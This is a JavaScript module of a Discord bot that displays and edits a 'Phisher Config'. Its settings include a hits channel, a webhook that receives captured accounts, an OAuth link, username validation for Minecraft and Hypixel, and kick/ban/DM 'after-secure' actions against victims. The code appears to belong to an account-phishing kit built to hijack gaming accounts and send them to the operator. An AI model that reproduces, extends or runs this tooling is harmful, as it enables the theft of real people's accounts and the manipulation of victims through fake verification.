const { EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, StringSelectMenuBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { codeblock } = require("../process/helpers");

module.exports = async function editphishermsg(botnumber, ownerid, id) {
    const hidebuttons = ownerid !== id;

    const check = await queryParams(
        `SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1`,
        [ownerid, botnumber]
    );

    if (!check || check.length === 0) {
        return {
            embeds: [
                new EmbedBuilder()
                    .setTitle("Error :x:")
                    .setDescription("Couldn't find your settings! Please report this to an admin.")
                    .setColor(0xff0000)
            ],
            ephemeral: true
        };
    }

    const settings = check[0];

    const usernameValidationStates = ["All", "MC", "MC & HYP"];
    const usernameValidation = usernameValidationStates[settings.validateusername] || "Error";

    const hitsChannel = settings.hits_channel ? settings.hits_channel.split("|")[0] : null;
    const logsChannel = settings.logs_channel ? settings.logs_channel.split("|")[0] : null;

    const verificationMode =
        settings.verification_type === 0 ? "Username + Email" :
        settings.verification_type === 1 ? "Username / Email" :
        settings.verification_type === 2 ? "DM Mode (/responses)" :
        "Unknown Mode";

    let afterSecureState = "Nothing";
    let currentState = "nothing";

    if (settings.aftersecure) {
        try {
            if (settings.aftersecure.startsWith("{")) {
                const parsed = JSON.parse(settings.aftersecure);
                let type = parsed.type.toLowerCase();
                if (type === "blacklistemail") type = "blacklist email";
                type = type.charAt(0).toUpperCase() + type.slice(1);
                afterSecureState = `${type}${parsed.value ? ": " + parsed.value : ""}`;
                currentState = parsed.type.toLowerCase();
            } else {
                let formatted = settings.aftersecure.toLowerCase();
                if (formatted === "blacklistemail") formatted = "blacklist email";
                afterSecureState = formatted.charAt(0).toUpperCase() + formatted.slice(1);
                currentState = settings.aftersecure.toLowerCase();
            }
        } catch {
            afterSecureState = "Nothing";
            currentState = "nothing";
        }
    }

    const embed = new EmbedBuilder()
        .setTitle("Your Phisher Config")
        .setDescription(`Aftersecure: ${afterSecureState}`)
        .setColor(0xADD8E6)
        .addFields(
            { name: "Embed Method", value: verificationMode, inline: true },
            { name: "OAuth URL", value: settings.oauth_link || "Not set.", inline: true },
            { name: "Auto Blacklist Emails", value: settings.blacklistemails === 1 ? "True" : "False", inline: true },
            { name: "Hits Channel", value: hitsChannel ? `<#${hitsChannel}>` : "Not set.", inline: true },
            { name: "Logs Channel", value: logsChannel ? `<#${logsChannel}>` : "Not set.", inline: true },
            { name: "Validate username", value: usernameValidation, inline: true }
        );

    if (!hidebuttons) {
        embed.addFields({ name: "Webhook to send account (only owner can see this)", value: settings.webhook ? codeblock(settings.webhook) : "Not set.", inline: true });
    }

    const buttonMode = new ButtonBuilder()
        .setCustomId(`changemode|${botnumber}|${ownerid}|${settings.verification_type === 0 ? 1 : 0}`)
        .setLabel(`Embed Method`)
        .setStyle(ButtonStyle.Primary);

    const buttonOAuth = new ButtonBuilder()
        .setCustomId(`changeoauth|${botnumber}|${ownerid}`)
        .setLabel(`OAuth`)
        .setStyle(ButtonStyle.Primary);

    const emailblacklistbutton = new ButtonBuilder()
        .setCustomId(`blacklistemails|${botnumber}|${ownerid}`)
        .setLabel(`Blacklist emails`)
        .setStyle(ButtonStyle.Primary);

    const validateusername = new ButtonBuilder()
        .setCustomId(`changevalidateusername|${botnumber}|${ownerid}`)
        .setLabel(`Validate username`)
        .setStyle(ButtonStyle.Primary);

    const webhook = new ButtonBuilder()
        .setCustomId(`changewebhook|${botnumber}|${ownerid}`)
        .setLabel("Change webhook")
        .setStyle(ButtonStyle.Success);

    const dropdown = new StringSelectMenuBuilder()
        .setCustomId(`changeaftersecure|${botnumber}|${ownerid}`)
        .setPlaceholder('Change After-Secure State')
        .addOptions([
            { label: 'After-Secure: Nothing', value: 'nothing', default: currentState === 'nothing' },
            { label: 'After-Secure: Kick', value: 'kick', default: currentState === 'kick' },
            { label: 'After-Secure: Ban', value: 'ban', default: currentState === 'ban' },
            { label: 'After-Secure: Blacklist', value: 'blacklist', default: currentState === 'blacklist' },
            { label: 'After-Secure: Role', value: 'role', default: currentState === 'role' },
            { label: 'After-Secure: DM', value: 'dm', default: currentState === 'dm' },
            { label: "After-Secure: DM Preset", value: "dmpreset", default: currentState === "dmpreset"}
        ]);

    const row1 = new ActionRowBuilder().addComponents(dropdown);
    const row2 = new ActionRowBuilder().addComponents(buttonMode, buttonOAuth, emailblacklistbutton, validateusername);

    if (hidebuttons) {
        return {
            embeds: [embed],
            components: [row1, row2],
            ephemeral: true
        };
    }

    const row3 = new ActionRowBuilder().addComponents(webhook);

    return {
        embeds: [embed],
        components: [row1, row2, row3],
        ephemeral: true
    };
};
